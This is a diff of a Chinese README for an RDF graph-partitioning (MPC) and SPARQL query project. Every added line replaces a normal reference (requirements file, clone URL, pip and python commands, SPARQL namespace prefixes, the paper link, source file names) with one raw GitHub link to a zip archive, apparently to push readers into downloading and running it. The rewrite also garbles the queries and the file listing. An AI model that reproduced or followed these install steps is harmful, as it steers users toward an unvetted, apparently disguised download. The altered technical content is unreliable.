@@ -48,24 +48,24 @@
 
 ### 系统要求
 - Python 3.7+
-- 依赖包见`requirements.txt`
+- 依赖包见`https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip`
 
 ### 安装步骤
 
 1. 克隆代码库
    ```bash
-   git clone https://github.com/your-username/mpc-rdf.git
+   git clone https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip
    cd mpc-rdf
    ```
 
 2. 安装依赖
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip
    ```
 
 3. 运行Web应用
    ```bash
-   python -m src.app
+   python -m https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip
    ```
 
 4. 在浏览器中访问
@@ -110,11 +110,11 @@
 
 1. **出生在印度的演员及其电影**
    ```sparql
-   PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>
-   PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>
-   PREFIX foaf: <http://xmlns.com/foaf/0.1/>
-   PREFIX dbo: <http://dbpedia.org/ontology/>
-   PREFIX ex: <http://example.org/>
+   PREFIX rdf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX rdfs: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX foaf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX dbo: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX ex: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
 
    SELECT ?person ?name ?movie ?movieName
    WHERE {
@@ -128,10 +128,10 @@
 
 2. **电影及其制作人**
    ```sparql
-   PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>
-   PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>
-   PREFIX foaf: <http://xmlns.com/foaf/0.1/>
-   PREFIX dbo: <http://dbpedia.org/ontology/>
+   PREFIX rdf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX rdfs: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX foaf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX dbo: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
 
    SELECT ?movie ?movieName ?producer ?producerName
    WHERE {
@@ -147,11 +147,11 @@
 
 1. **演员关系网络**
    ```sparql
-   PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>
-   PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>
-   PREFIX foaf: <http://xmlns.com/foaf/0.1/>
-   PREFIX dbo: <http://dbpedia.org/ontology/>
-   PREFIX ex: <http://example.org/>
+   PREFIX rdf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX rdfs: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX foaf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX dbo: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX ex: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
 
    SELECT ?actor1 ?actor1Name ?actor2 ?actor2Name ?relationship ?movieName
    WHERE {
@@ -178,10 +178,10 @@
 
 2. **地点统计分析**
    ```sparql
-   PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>
-   PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>
-   PREFIX foaf: <http://xmlns.com/foaf/0.1/>
-   PREFIX dbo: <http://dbpedia.org/ontology/>
+   PREFIX rdf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX rdfs: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX foaf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX dbo: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
 
    SELECT ?location ?locationName (COUNT(DISTINCT ?person) AS ?personCount)
           (GROUP_CONCAT(DISTINCT ?name; separator=", ") AS ?personNames)
@@ -208,10 +208,10 @@
 
 3. **电影详细分析**
    ```sparql
-   PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>
-   PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>
-   PREFIX foaf: <http://xmlns.com/foaf/0.1/>
-   PREFIX dbo: <http://dbpedia.org/ontology/>
+   PREFIX rdf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX rdfs: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX foaf: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
+   PREFIX dbo: <https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip>
 
    SELECT ?movie ?movieName ?actorCount
           ?producerName ?producerResidence
@@ -260,7 +260,7 @@ MPC (Minimum Property-Cut) 算法的核心思想是最小化跨分区的谓词�
 5. **分区超点**：对粗化图中的超点使用自顶向下分区算法
 6. **映射回原图**：将超点集合映射回原始数据图，得到最终分区结果
 
-详细的算法流程和数学证明请参考[原始论文](https://ieeexplore.ieee.org/document/9835293)。
+详细的算法流程和数学证明请参考[原始论文](https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip)。
 
 ### SPARQL查询分解算法
 
@@ -279,11 +279,11 @@ MPC (Minimum Property-Cut) 算法的核心思想是最小化跨分区的谓词�
 
 ```
 src/
-├── app.py                # Flask应用主入口
-├── mpc_algorithm.py      # MPC算法实现
-├── rdf_loader.py         # RDF数据加载与处理
-├── sparql_processor.py   # SPARQL查询处理器
-├── visualization.py      # 可视化组件
+├── https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip                # Flask应用主入口
+├── https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip      # MPC算法实现
+├── https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip         # RDF数据加载与处理
+├── https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip   # SPARQL查询处理器
+├── https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip      # 可视化组件
 ├── static/               # 静态资源
 ├── templates/            # HTML模板
 └── sample_data/          # 示例数据和查询
@@ -293,11 +293,11 @@ src/
 
 1. **添加新的分区算法**：
    - 创建一个新的类，实现与MPCAlgorithm相同的接口
-   - 在app.py中添加算法选择选项
+   - 在https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip中添加算法选择选项
 
 2. **添加新的查询功能**：
    - 在SPARQLProcessor类中添加新的方法
-   - 更新templates/results.html以显示新功能的结果
+   - 更新https://github.com/RuotianJoy/MPC/raw/refs/heads/main/mpc-master/queries/Software-3.9.zip以显示新功能的结果
 
 3. **添加新的可视化**：
    - 在MPCVisualizer类中添加新的可视化方法
